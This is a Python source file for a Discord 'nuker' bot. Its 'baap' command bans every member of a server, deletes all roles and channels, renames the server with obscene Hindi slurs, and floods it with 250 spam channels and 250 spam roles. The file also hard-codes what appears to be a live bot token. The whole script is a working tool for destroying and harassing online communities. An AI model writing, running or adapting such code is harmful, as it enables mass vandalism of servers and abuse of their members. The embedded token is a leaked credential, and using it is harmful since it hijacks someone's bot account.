import discord
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
from aiohttp import ClientSession
import aiohttp
import jishaku

intents = discord.Intents.all()
bot = commands.Bot(command_prefix = '-', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}({bot.user.id})')

@bot.command(aliases=["devil"])
@commands.guild_only()
async def baap(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            continue
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            continue
    try:
        await ctx.guild.edit(
            name="BLACK PAPA KO KRO FEEL",
            description="MAA CHOD DENGE",
            reason="SERVER NUKED BY BLACK",
            icon=None,
            banner=None
        )  
    except:
        pass
    try:    
        for _i in range(250):
            await ctx.guild.create_text_channel(name="BLACK PAPA OP")
    except:
        pass
    try:
        for _i in range(250):
            await ctx.guild.create_role(name="BLACK OP", color=0xF00A0A)
    except:
        pass

bot.load_extension('jishaku')
bot.run('ODM0Nzg1NTE2OTY4ODY5OTQ4.YIF8mA.GKDKzpYdB3e1ntohXe0f7kzY5b8')    